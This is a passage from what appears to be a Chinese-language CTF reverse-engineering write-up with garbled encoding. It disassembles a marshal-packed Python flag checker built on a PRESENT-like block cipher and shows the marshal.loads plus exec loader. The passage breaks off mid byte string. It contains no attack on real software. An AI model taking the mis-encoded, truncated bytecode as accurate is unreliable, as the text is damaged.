xa9\x00)\x02\xda\x05stateZ\x08roundkeyr\x00\x00\x00\x00r\x00\x00\x00\x00\xda\x00\xda\x0baddRoundKey\x02\x00\x00\x00s\x02\x00\x00\x00\x00\x01r\x03\x00\x00\x00s,\t\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x06\x00\x00\x00C\x00\x00\x00s6\x00\x00\x00d\x01&#125;\x01t\x00d\x02\x83\x01D\x00]$&#125;\x02|\x01t\x01|\x00|\x02d\x03\x14\x00?\x00d\x04@\x00\x19\x00|\x02d\x03\x14\x00&gt;\x007\x00&#125;\x01q\x0c|\x01S\x00)\x05N\xe9\x00\x00\x00\x00\xe9\x10\x00\x00\x00\xe9\x04\x00\x00\x00\xe9\x0f\x00\x00\x00)\x02\xda\x05rangeZ\x04Sbox)\x03\xda\x05state\xda\x06output\xda\x01i\xa9\x00r\x08\x00\x00\x00\xda\x00\xda\tsBoxLayer\x02\x00\x00\x00s\x08\x00\x00\x00\x00\x01\x04\x01\x0c\x01&quot;\x01r\n\x00\x00\x00s\xe4\x07\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x05\x00\x00\x00C\x00\x00\x00s.\x00\x00\x00d\x01&#125;\x01t\x00d\x02\x83\x01D\x00]\x1c&#125;\x02|\x01|\x00|\x02?\x00d\x03@\x00t\x01|\x02\x19\x00&gt;\x007\x00&#125;\x01q\x0c|\x01S\x00)\x04N\xe9\x00\x00\x00\x00\xe9@\x00\x00\x00\xe9\x01\x00\x00\x00)\x02\xda\x05rangeZ\x04PBox)\x03\xda\x05state\xda\x06output\xda\x01i\xa9\x00r\x07\x00\x00\x00\xda\x00\xda\x06pLayer\x02\x00\x00\x00s\x08\x00\x00\x00\x00\x01\x04\x01\x0c\x01\x1a\x01r\t\x00\x00\x00s\xac\x06\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x04\x00\x00\x00\x03\x00\x00\x00s\x1a\x00\x00\x00t\x00\x87\x00f\x01d\x01d\x02\x84\x08t\x01d\x03\x83\x01D\x00\x83\x01\x83\x01S\x00)\x04Nc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x05\x00\x00\x00\x13\x00\x00\x00s \x00\x00\x00g\x00|\x00]\x18&#125;\x01t\x00\x88\x00|\x01\x19\x00\x83\x01d\x00|\x01\x14\x00&gt;\x00\x91\x02q\x04S\x00)\x01\xe9\x08\x00\x00\x00)\x01\xda\x03ord)\x02\xda\x02.0\xda\x01c\xa9\x01\xda\x01i\xa9\x00\xda\x00\xda\n&lt;listcomp&gt;\x03\x00\x00\x00s\x04\x00\x00\x00\x06\x00\x02\x00z!string2number.&lt;locals&gt;.&lt;listcomp&gt;r\x00\x00\x00\x00)\x02\xda\x03sum\xda\x05ranger\x04\x00\x00\x00r\x06\x00\x00\x00r\x04\x00\x00\x00r\x07\x00\x00\x00\xda\rstring2number\x02\x00\x00\x00s\x02\x00\x00\x00\x00\x01r\x0b\x00\x00\x00s\x01\x05\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x05\x00\x00\x00C\x00\x00\x00st\x00\x00\x00g\x00&#125;\x02t\x00d\x01|\x01d\x01\x17\x00d\x01\x83\x03D\x00]Z&#125;\x03|\x02\xa0\x01|\x00d\x02?\x00\xa1\x01\x01\x00|\x00d\x03@\x00d\x04&gt;\x00|\x00d\x05?\x00\x17\x00&#125;\x00t\x02|\x00d\x06?\x00\x19\x00d\x06&gt;\x00|\x00d\x07d\x06\x13\x00d\x01\x18\x00@\x00\x17\x00&#125;\x00|\x00|\x03d\x08&gt;\x00|\x00d\x05?\x00A\x00N\x00&#125;\x00q\x14|\x02S\x00)\tN\xe9\x01\x00\x00\x00\xe9\x10\x00\x00\x00i\xff\xff\x07\x00\xe9=\x00\x00\x00\xe9\x13\x00\x00\x00\xe9L\x00\x00\x00\xe9\x02\x00\x00\x00\xe9\x0f\x00\x00\x00)\x03\xda\x05range\xda\x06appendZ\x04Sbox)\x04\xda\x03key\xda\x06roundsZ\troundkeys\xda\x01i\xa9\x00r\x0c\x00\x00\x00\xda\x00\xda\x13generateRoundkeys80\x02\x00\x00\x00s\x0e\x00\x00\x00\x00\x01\x04\x01\x14\x01\x0e\x01\x14\x01 \x01\x16\x01r\x0e\x00\x00\x00sF\x03\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00@\x00\x00\x00s\xa6\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01d\x02\x83\x01Z\x02e\x03e\x02\x83\x01d\x03k\x03r,e\x04d\x04\x83\x01\x01\x00e\x05d\x05\x83\x01\x01\x00e\x02d\x06d\x07\x85\x02\x19\x00e\x02d\x07d\x08\x85\x02\x19\x00e\x02d\x08d\t\x85\x02\x19\x00e\x02d\td\x03\x85\x02\x19\x00g\x04Z\x06d\nd\x0bd\x0cd\rg\x04Z\x07e\x00e\x06\x83\x01Z\x08e\td\x0e\x83\x01D\x00]$Z\ne\x07e\n\x19\x00e\x08e\n\x19\x00k\x03rte\x04d\x04\x83\x01\x01\x00e\x05d\x05\x83\x01\x01\x00qte\x04d\x0f\x83\x01\x01\x00d\x06S\x00)\x10c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x06\x00\x00\x00C\x00\x00\x00sp\x00\x00\x00d\x01&#125;\x01t\x00d\x02|\x01\x83\x02&#125;\x02g\x00&#125;\x03|\x00D\x00]T&#125;\x04t\x01|\x04\x83\x01&#125;\x05t\x02|\x01d\x03\x18\x00\x83\x01D\x00]&quot;&#125;\x06t\x03|\x05|\x02|\x06\x19\x00\x83\x02&#125;\x05t\x04|\x05\x83\x01&#125;\x05t\x05|\x05\x83\x01&#125;\x05q.t\x03|\x05|\x02d\x04\x19\x00\x83\x02&#125;\x07|\x03\xa0\x06|\x07\xa1\x01\x01\x00q\x16|\x03S\x00)\x05N\xe9 \x00\x00\x00l\x06\x00\x00\x00! 20\\X\xa8 1!\x02\x00\xe9\x01\x00\x00\x00\xe9\xff\xff\xff\xff)\x07Z\x13generateRoundkeys80Z\rstring2number\xda\x05rangeZ\x0baddRoundKeyZ\tsBoxLayerZ\x06pLayer\xda\x06append)\x08\xda\x06blocks\xda\x06roundsZ\troundkeysZ\x03outZ\x05block\xda\x05state\xda\x01iZ\x06cipher\xa9\x00r\t\x00\x00\x00\xda\x00\xda\x07encrypt\x02\x00\x00\x00s\x18\x00\x00\x00\x00\x01\x04\x01\n\x01\x04\x01\x08\x01\x08\x01\x10\x01\x0e\x01\x08\x01\n\x01\x0e\x01\x0c\x01r\x0b\x00\x00\x00z\x12pls input ur flag:r\x00\x00\x00\x00z\x0bwrong flag!\xe9\x00\x00\x00\x00N\xe9\x08\x00\x00\x00\xe9\x10\x00\x00\x00\xe9\x18\x00\x00\x00l\x04\x00\x00\x00\x9e\x1faH\xc4\x13d\rl\x05\x00\x00\x00b]t:\x94Z\x15\x18\x0e\x00l\x04\x00\x00\x000ek95\x04\xb2&quot;l\x05\x00\x00\x00\x88o\xeddY\x13\xb1L\x01\x00\xe9\x04\x00\x00\x00z\x08Correct!)\x0br\x0b\x00\x00\x00\xda\x05inputZ\x03inp\xda\x03len\xda\x05print\xda\x04exitr\x05\x00\x00\x00Z\x04cmpsZ\nout_blocksr\x03\x00\x00\x00r\x08\x00\x00\x00r\t\x00\x00\x00r\t\x00\x00\x00r\t\x00\x00\x00r\n\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x18\x00\x00\x00\x08\x0e\x08\x01\x0c\x01\x08\x01\x08\x01,\x01\x0c\x01\x08\x01\x0c\x01\x10\x01\x08\x01\n\x01N)\x05r\x0e\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x0c\x00\x00\x00r\x0c\x00\x00\x00r\x0c\x00\x00\x00r\r\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\t\n\x01N)\x05r\x0b\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x06\x00\x00\x00r\x06\x00\x00\x00r\x06\x00\x00\x00r\x07\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x03\n\x01N)\x05r\t\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x07\x00\x00\x00r\x07\x00\x00\x00r\x07\x00\x00\x00r\x08\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x06\n\x01N)\x05r\n\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x08\x00\x00\x00r\x08\x00\x00\x00r\x08\x00\x00\x00r\t\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x06\n\x01N)\x05r\x03\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x00\x00\x00\x00r\x00\x00\x00\x00r\x00\x00\x00\x00r\x02\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x03\n\x01N)\tr\x11\x00\x00\x00\xda\x05rangeZ\x08Sbox_invrH\x00\x00\x00Z\x08PBox_inv\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x10\x00\x00\x00r\x10\x00\x00\x00r\x10\x00\x00\x00r\x16\x00\x00\x00\xda\x08&lt;module&gt;\x03\x00\x00\x00sl\x00\x00\x00$\x01\x12\x01 \x01\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x01\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x01\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\xfd\x04\x04\x12\x02\n\x01&#x27;</span></span><br><span class="line"></span><br><span class="line">l = marshal.loads(code)</span><br><span class="line"><span class="built_in">exec</span>(l)</span><br></pre></td></tr></table></figure>
<p>ç›´æ¥æ‰§è¡Œæ˜¯ä¼šæŠ¥é”™çš„ æ‹¿åˆ°è¿™ç§è¿˜æ˜¯å…ˆç”¨dis.disæŸ¥çœ‹ä¸‹å­—èŠ‚ç (æœ¬åœ°è·‘è¿˜ä¸€ç›´æŠ¥é”™ ç”¨åœ¨çº¿pythonè·‘å°±è¡Œäº†)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">l = marshal.loads(code)</span><br><span class="line"><span class="keyword">import</span> dis</span><br><span class="line">dis.dis(l)</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥å‘ç°é‡Œé¢è¿˜åµŒäº†marshal</p>
<details>
<summary>ç‚¹å‡»æŸ¥çœ‹ä»£ç </summary>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  3           0 LOAD_CONST               0 (12)</span><br><span class="line">              2 LOAD_CONST               1 (5)</span><br><span class="line">              4 LOAD_CONST               2 (6)</span><br><span class="line">              6 LOAD_CONST               3 (11)</span><br><span class="line">              8 LOAD_CONST               4 (9)</span><br><span class="line">             10 LOAD_CONST               5 (0)</span><br><span class="line">             12 LOAD_CONST               6 (10)</span><br><span class="line">             14 LOAD_CONST               7 (13)</span><br><span class="line">             16 LOAD_CONST               8 (3)</span><br><span class="line">             18 LOAD_CONST               9 (14)</span><br><span class="line">             20 LOAD_CONST              10 (15)</span><br><span class="line">             22 LOAD_CONST              11 (8)</span><br><span class="line">             24 LOAD_CONST              12 (4)</span><br><span class="line">             26 LOAD_CONST              13 (7)</span><br><span class="line">             28 LOAD_CONST              14 (1)</span><br><span class="line">             30 LOAD_CONST              15 (2)</span><br><span class="line">             32 BUILD_LIST              16</span><br><span class="line">             34 STORE_NAME               0 (Sbox)</span><br><span class="line"></span><br><span class="line">  4          36 LOAD_CONST              16 (&lt;code object &lt;listcomp&gt; at 0x7fbf6f8f83a0, file &quot;&quot;, line 4&gt;)</span><br><span class="line">             38 LOAD_CONST              17 (&#x27;&lt;listcomp&gt;&#x27;)</span><br><span class="line">             40 MAKE_FUNCTION            0</span><br><span class="line">             42 LOAD_NAME                1 (range)</span><br><span class="line">             44 LOAD_CONST              18 (16)</span><br><span class="line">             46 CALL_FUNCTION            1</span><br><span class="line">             48 GET_ITER</span><br><span class="line">             50 CALL_FUNCTION            1</span><br><span class="line">             52 STORE_NAME               2 (Sbox_inv)</span><br><span class="line"></span><br><span class="line">  5          54 LOAD_CONST               5 (0)</span><br><span class="line">             56 LOAD_CONST              18 (16)</span><br><span class="line">             58 LOAD_CONST              19 (32)</span><br><span class="line">             60 LOAD_CONST              20 (48)</span><br><span class="line">             62 LOAD_CONST              14 (1)</span><br><span class="line">             64 LOAD_CONST              21 (17)</span><br><span class="line">             66 LOAD_CONST              22 (33)</span><br><span class="line">             68 LOAD_CONST              23 (49)</span><br><span class="line">             70 LOAD_CONST              15 (2)</span><br><span class="line">             72 LOAD_CONST              24 (18)</span><br><span class="line">             74 LOAD_CONST              25 (34)</span><br><span class="line">             76 LOAD_CONST              26 (50)</span><br><span class="line">             78 LOAD_CONST               8 (3)</span><br><span class="line">             80 LOAD_CONST              27 (19)</span><br><span class="line">             82 LOAD_CONST              28 (35)</span><br><span class="line">             84 LOAD_CONST              29 (51)</span><br><span class="line"></span><br><span class="line">  6          86 LOAD_CONST              12 (4)</span><br><span class="line">             88 LOAD_CONST              30 (20)</span><br><span class="line">             90 LOAD_CONST              31 (36)</span><br><span class="line">             92 LOAD_CONST              32 (52)</span><br><span class="line">             94 LOAD_CONST               1 (5)</span><br><span class="line">             96 LOAD_CONST              33 (21)</span><br><span class="line">             98 LOAD_CONST              34 (37)</span><br><span class="line">            100 LOAD_CONST              35 (53)</span><br><span class="line">            102 LOAD_CONST               2 (6)</span><br><span class="line">            104 LOAD_CONST              36 (22)</span><br><span class="line">            106 LOAD_CONST              37 (38)</span><br><span class="line">            108 LOAD_CONST              38 (54)</span><br><span class="line">            110 LOAD_CONST              13 (7)</span><br><span class="line">            112 LOAD_CONST              39 (23)</span><br><span class="line">            114 LOAD_CONST              40 (39)</span><br><span class="line">            116 LOAD_CONST              41 (55)</span><br><span class="line"></span><br><span class="line">  7         118 LOAD_CONST              11 (8)</span><br><span class="line">            120 LOAD_CONST              42 (24)</span><br><span class="line">            122 LOAD_CONST              43 (40)</span><br><span class="line">            124 LOAD_CONST              44 (56)</span><br><span class="line">            126 LOAD_CONST               4 (9)</span><br><span class="line">            128 LOAD_CONST              45 (25)</span><br><span class="line">            130 LOAD_CONST              46 (41)</span><br><span class="line">            132 LOAD_CONST              47 (57)</span><br><span class="line">            134 LOAD_CONST               6 (10)</span><br><span class="line">            136 LOAD_CONST              48 (26)</span><br><span class="line">            138 LOAD_CONST              49 (42)</span><br><span class="line">            140 LOAD_CONST              50 (58)</span><br><span class="line">            142 LOAD_CONST               3 (11)</span><br><span class="line">            144 LOAD_CONST              51 (27)</span><br><span class="line">            146 LOAD_CONST              52 (43)</span><br><span class="line">            148 LOAD_CONST              53 (59)</span><br><span class="line"></span><br><span class="line">  8         150 LOAD_CONST               0 (12)</span><br><span class="line">            152 LOAD_CONST              54 (28)</span><br><span class="line">            154 LOAD_CONST              55 (44)</span><br><span class="line">            156 LOAD_CONST              56 (60)</span><br><span class="line">            158 LOAD_CONST               7 (13)</span><br><span class="line">            160 LOAD_CONST              57 (29)</span><br><span class="line">            162 LOAD_CONST              58 (45)</span><br><span class="line">            164 LOAD_CONST              59 (61)</span><br><span class="line">            166 LOAD_CONST               9 (14)</span><br><span class="line">            168 LOAD_CONST              60 (30)</span><br><span class="line">            170 LOAD_CONST              61 (46)</span><br><span class="line">            172 LOAD_CONST              62 (62)</span><br><span class="line">            174 LOAD_CONST              10 (15)</span><br><span class="line">            176 LOAD_CONST              63 (31)</span><br><span class="line">            178 LOAD_CONST              64 (47)</span><br><span class="line">            180 LOAD_CONST              65 (63)</span><br><span class="line"></span><br><span class="line">  5         182 BUILD_LIST              64</span><br><span class="line">            184 STORE_NAME               3 (PBox)</span><br><span class="line"></span><br><span class="line">  9         186 LOAD_CONST              66 (&lt;code object &lt;listcomp&gt; at 0x7fbf6f8f8660, file &quot;&quot;, line 9&gt;)</span><br><span class="line">            188 LOAD_CONST              17 (&#x27;&lt;listcomp&gt;&#x27;)</span><br><span class="line">            190 MAKE_FUNCTION            0</span><br><span class="line">            192 LOAD_NAME                1 (range)</span><br><span class="line">            194 LOAD_CONST              67 (64)</span><br><span class="line">            196 CALL_FUNCTION            1</span><br><span class="line">            198 GET_ITER</span><br><span class="line">            200 CALL_FUNCTION            1</span><br><span class="line">            202 STORE_NAME               4 (PBox_inv)</span><br><span class="line"></span><br><span class="line"> 11         204 LOAD_NAME                5 (marshal)</span><br><span class="line">            206 LOAD_METHOD              6 (loads)</span><br><span class="line">            208 LOAD_CONST              68 (b&#x27;c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00C\x00\x00\x00s\x08\x00\x00\x00|\x00|\x01A\x00S\x00)\x01N\xa9\x00)\x02\xda\x05stateZ\x08roundkeyr\x00\x00\x00\x00r\x00\x00\x00\x00\xda\x00\xda\x0baddRoundKey\x02\x00\x00\x00s\x02\x00\x00\x00\x00\x01r\x03\x00\x00\x00s,\t\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x06\x00\x00\x00C\x00\x00\x00s6\x00\x00\x00d\x01&#125;\x01t\x00d\x02\x83\x01D\x00]$&#125;\x02|\x01t\x01|\x00|\x02d\x03\x14\x00?\x00d\x04@\x00\x19\x00|\x02d\x03\x14\x00&gt;\x007\x00&#125;\x01q\x0c|\x01S\x00)\x05N\xe9\x00\x00\x00\x00\xe9\x10\x00\x00\x00\xe9\x04\x00\x00\x00\xe9\x0f\x00\x00\x00)\x02\xda\x05rangeZ\x04Sbox)\x03\xda\x05state\xda\x06output\xda\x01i\xa9\x00r\x08\x00\x00\x00\xda\x00\xda\tsBoxLayer\x02\x00\x00\x00s\x08\x00\x00\x00\x00\x01\x04\x01\x0c\x01&quot;\x01r\n\x00\x00\x00s\xe4\x07\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x05\x00\x00\x00C\x00\x00\x00s.\x00\x00\x00d\x01&#125;\x01t\x00d\x02\x83\x01D\x00]\x1c&#125;\x02|\x01|\x00|\x02?\x00d\x03@\x00t\x01|\x02\x19\x00&gt;\x007\x00&#125;\x01q\x0c|\x01S\x00)\x04N\xe9\x00\x00\x00\x00\xe9@\x00\x00\x00\xe9\x01\x00\x00\x00)\x02\xda\x05rangeZ\x04PBox)\x03\xda\x05state\xda\x06output\xda\x01i\xa9\x00r\x07\x00\x00\x00\xda\x00\xda\x06pLayer\x02\x00\x00\x00s\x08\x00\x00\x00\x00\x01\x04\x01\x0c\x01\x1a\x01r\t\x00\x00\x00s\xac\x06\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x04\x00\x00\x00\x03\x00\x00\x00s\x1a\x00\x00\x00t\x00\x87\x00f\x01d\x01d\x02\x84\x08t\x01d\x03\x83\x01D\x00\x83\x01\x83\x01S\x00)\x04Nc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x05\x00\x00\x00\x13\x00\x00\x00s \x00\x00\x00g\x00|\x00]\x18&#125;\x01t\x00\x88\x00|\x01\x19\x00\x83\x01d\x00|\x01\x14\x00&gt;\x00\x91\x02q\x04S\x00)\x01\xe9\x08\x00\x00\x00)\x01\xda\x03ord)\x02\xda\x02.0\xda\x01c\xa9\x01\xda\x01i\xa9\x00\xda\x00\xda\n&lt;listcomp&gt;\x03\x00\x00\x00s\x04\x00\x00\x00\x06\x00\x02\x00z!string2number.&lt;locals&gt;.&lt;listcomp&gt;r\x00\x00\x00\x00)\x02\xda\x03sum\xda\x05ranger\x04\x00\x00\x00r\x06\x00\x00\x00r\x04\x00\x00\x00r\x07\x00\x00\x00\xda\rstring2number\x02\x00\x00\x00s\x02\x00\x00\x00\x00\x01r\x0b\x00\x00\x00s\x01\x05\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x05\x00\x00\x00C\x00\x00\x00st\x00\x00\x00g\x00&#125;\x02t\x00d\x01|\x01d\x01\x17\x00d\x01\x83\x03D\x00]Z&#125;\x03|\x02\xa0\x01|\x00d\x02?\x00\xa1\x01\x01\x00|\x00d\x03@\x00d\x04&gt;\x00|\x00d\x05?\x00\x17\x00&#125;\x00t\x02|\x00d\x06?\x00\x19\x00d\x06&gt;\x00|\x00d\x07d\x06\x13\x00d\x01\x18\x00@\x00\x17\x00&#125;\x00|\x00|\x03d\x08&gt;\x00|\x00d\x05?\x00A\x00N\x00&#125;\x00q\x14|\x02S\x00)\tN\xe9\x01\x00\x00\x00\xe9\x10\x00\x00\x00i\xff\xff\x07\x00\xe9=\x00\x00\x00\xe9\x13\x00\x00\x00\xe9L\x00\x00\x00\xe9\x02\x00\x00\x00\xe9\x0f\x00\x00\x00)\x03\xda\x05range\xda\x06appendZ\x04Sbox)\x04\xda\x03key\xda\x06roundsZ\troundkeys\xda\x01i\xa9\x00r\x0c\x00\x00\x00\xda\x00\xda\x13generateRoundkeys80\x02\x00\x00\x00s\x0e\x00\x00\x00\x00\x01\x04\x01\x14\x01\x0e\x01\x14\x01 \x01\x16\x01r\x0e\x00\x00\x00sF\x03\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00@\x00\x00\x00s\xa6\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01d\x02\x83\x01Z\x02e\x03e\x02\x83\x01d\x03k\x03r,e\x04d\x04\x83\x01\x01\x00e\x05d\x05\x83\x01\x01\x00e\x02d\x06d\x07\x85\x02\x19\x00e\x02d\x07d\x08\x85\x02\x19\x00e\x02d\x08d\t\x85\x02\x19\x00e\x02d\td\x03\x85\x02\x19\x00g\x04Z\x06d\nd\x0bd\x0cd\rg\x04Z\x07e\x00e\x06\x83\x01Z\x08e\td\x0e\x83\x01D\x00]$Z\ne\x07e\n\x19\x00e\x08e\n\x19\x00k\x03rte\x04d\x04\x83\x01\x01\x00e\x05d\x05\x83\x01\x01\x00qte\x04d\x0f\x83\x01\x01\x00d\x06S\x00)\x10c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x06\x00\x00\x00C\x00\x00\x00sp\x00\x00\x00d\x01&#125;\x01t\x00d\x02|\x01\x83\x02&#125;\x02g\x00&#125;\x03|\x00D\x00]T&#125;\x04t\x01|\x04\x83\x01&#125;\x05t\x02|\x01d\x03\x18\x00\x83\x01D\x00]&quot;&#125;\x06t\x03|\x05|\x02|\x06\x19\x00\x83\x02&#125;\x05t\x04|\x05\x83\x01&#125;\x05t\x05|\x05\x83\x01&#125;\x05q.t\x03|\x05|\x02d\x04\x19\x00\x83\x02&#125;\x07|\x03\xa0\x06|\x07\xa1\x01\x01\x00q\x16|\x03S\x00)\x05N\xe9 \x00\x00\x00l\x06\x00\x00\x00! 20\\X\xa8 1!\x02\x00\xe9\x01\x00\x00\x00\xe9\xff\xff\xff\xff)\x07Z\x13generateRoundkeys80Z\rstring2number\xda\x05rangeZ\x0baddRoundKeyZ\tsBoxLayerZ\x06pLayer\xda\x06append)\x08\xda\x06blocks\xda\x06roundsZ\troundkeysZ\x03outZ\x05block\xda\x05state\xda\x01iZ\x06cipher\xa9\x00r\t\x00\x00\x00\xda\x00\xda\x07encrypt\x02\x00\x00\x00s\x18\x00\x00\x00\x00\x01\x04\x01\n\x01\x04\x01\x08\x01\x08\x01\x10\x01\x0e\x01\x08\x01\n\x01\x0e\x01\x0c\x01r\x0b\x00\x00\x00z\x12pls input ur flag:r\x00\x00\x00\x00z\x0bwrong flag!\xe9\x00\x00\x00\x00N\xe9\x08\x00\x00\x00\xe9\x10\x00\x00\x00\xe9\x18\x00\x00\x00l\x04\x00\x00\x00\x9e\x1faH\xc4\x13d\rl\x05\x00\x00\x00b]t:\x94Z\x15\x18\x0e\x00l\x04\x00\x00\x000ek95\x04\xb2&quot;l\x05\x00\x00\x00\x88o\xeddY\x13\xb1L\x01\x00\xe9\x04\x00\x00\x00z\x08Correct!)\x0br\x0b\x00\x00\x00\xda\x05inputZ\x03inp\xda\x03len\xda\x05print\xda\x04exitr\x05\x00\x00\x00Z\x04cmpsZ\nout_blocksr\x03\x00\x00\x00r\x08\x00\x00\x00r\t\x00\x00\x00r\t\x00\x00\x00r\t\x00\x00\x00r\n\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x18\x00\x00\x00\x08\x0e\x08\x01\x0c\x01\x08\x01\x08\x01,\x01\x0c\x01\x08\x01\x0c\x01\x10\x01\x08\x01\n\x01N)\x05r\x0e\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x0c\x00\x00\x00r\x0c\x00\x00\x00r\x0c\x00\x00\x00r\r\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\t\n\x01N)\x05r\x0b\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x06\x00\x00\x00r\x06\x00\x00\x00r\x06\x00\x00\x00r\x07\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x03\n\x01N)\x05r\t\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x07\x00\x00\x00r\x07\x00\x00\x00r\x07\x00\x00\x00r\x08\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x06\n\x01N)\x05r\n\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x08\x00\x00\x00r\x08\x00\x00\x00r\x08\x00\x00\x00r\t\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x06\n\x01N)\x05r\x03\x00\x00\x00\x